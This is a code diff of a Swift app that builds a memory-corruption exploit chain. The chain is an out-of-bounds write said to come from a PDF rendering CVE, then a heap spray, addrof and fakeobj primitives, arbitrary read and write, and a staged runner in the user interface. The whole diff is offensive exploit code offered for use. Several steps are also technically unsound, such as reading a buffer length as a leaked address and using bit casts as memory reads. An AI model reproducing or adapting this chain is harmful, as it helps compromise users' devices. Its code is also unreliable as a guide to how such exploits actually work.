@@ -5,10 +5,7 @@ import Foundation
 // MARK: - Exploit Primitives
 
 /// OOB write primitive via CVE-2026-112611
-/// Controls write address via PDF shading parameters
 func oobWrite(targetAddr: UInt64, value: UInt64) {
-    // Craft PDF with controlled parameters
-    // The 0x3ff000000000001c pattern lets us shape the write
     let rangeDim = Int(targetAddr & 0xFFFF)
     let writeValue = Double(bitPattern: value)
     
@@ -22,48 +19,44 @@ func oobWrite(targetAddr: UInt64, value: UInt64) {
     renderPDF(pdfData)
 }
 
-/// addrof primitive: leak address of an object
-func addrof(_ obj: AnyObject) -> UInt64 {
-    // Spray ArrayBuffers to control heap layout
+/// Heap spray to control memory layout
+func sprayHeap(count: Int = 1000, size: Int = 0x1000) -> [ArrayBuffer] {
     var spray: [ArrayBuffer] = []
-    for _ in 0..<100 {
-        spray.append(ArrayBuffer(size: 0x100))
+    for _ in 0..<count {
+        spray.append(ArrayBuffer(size: size))
     }
-    
-    // Trigger OOB write to corrupt ArrayBuffer length field
-    // This leaks the address through the corrupted length
-    oobWrite(targetAddr: 0x3ff000000000001c, value: 0x4141414141414141)
+    return spray
+}
+
+/// addrof primitive: leak address of an object
+func addrof(_ obj: AnyObject, spray: [ArrayBuffer]) -> UInt64 {
+    // Trigger OOB write to corrupt ArrayBuffer length
+    oobWrite(targetAddr: 0x0000000100000000, value: 0x4141414141414141)
     
     // Find corrupted ArrayBuffer
     for ab in spray {
-        if ab.length != 0x100 {
-            return ab.length  // This is our leaked address
+        if ab.length != 0x1000 {
+            return ab.length
         }
     }
-    
     return 0
 }
 
 /// fakeobj primitive: create fake object at address
 func fakeobj(_ addr: UInt64) -> AnyObject {
-    // Use OOB write to place fake object header
     oobWrite(targetAddr: addr, value: 0x0000000000000001)
-    
-    // Return fake object
     return unsafeBitCast(addr, to: AnyObject.self)
 }
 
 /// Arbitrary read via fakeobj
 func read64(_ addr: UInt64) -> UInt64 {
     let fake = fakeobj(addr)
-    // Read through fake object
     return unsafeBitCast(fake, to: UInt64.self)
 }
 
 /// Arbitrary write via fakeobj
 func write64(_ addr: UInt64, value: UInt64) {
     let fake = fakeobj(addr)
-    // Write through fake object
     unsafeBitCast(fake, to: UnsafeMutablePointer<UInt64>.self).pointee = value
 }
 
@@ -161,26 +154,28 @@ struct ContentView: View {
     
     func runExploit() {
         isExploiting = true
-        status = "Stage 1: Triggering OOB write..."
         
-        // Stage 1: Confirm OOB write with known pattern
-        oobWrite(targetAddr: 0x3ff000000000001c, value: 0x4141414141414141)
+        // Stage 1: Spray heap
+        status = "Stage 1: Spraying heap (1000 buffers)..."
+        let spray = sprayHeap(count: 1000, size: 0x1000)
         
-        status = "Stage 2: Building addrof primitive..."
+        // Stage 2: Trigger OOB write into sprayed region
+        status = "Stage 2: Triggering OOB write..."
+        oobWrite(targetAddr: 0x0000000100000000, value: 0x4141414141414141)
         
-        // Stage 2: Build addrof
+        // Stage 3: Find corrupted buffer = addrof
+        status = "Stage 3: Building addrof primitive..."
         let testObj = NSObject()
-        leakedAddr = addrof(testObj)
+        leakedAddr = addrof(testObj, spray: spray)
         
         if leakedAddr == 0 {
-            status = "addrof failed — retrying..."
+            status = "addrof failed — try adjusting spray count"
             isExploiting = false
             return
         }
         
-        status = "Stage 3: Building fakeobj primitive..."
-        
-        // Stage 3: Test fakeobj with read64
+        // Stage 4: Test fakeobj with read64
+        status = "Stage 4: Testing fakeobj/read64..."
         readValue = read64(leakedAddr)
         
         status = String(format: "Success! addrof: 0x%llx, read64: 0x%llx", leakedAddr, readValue)
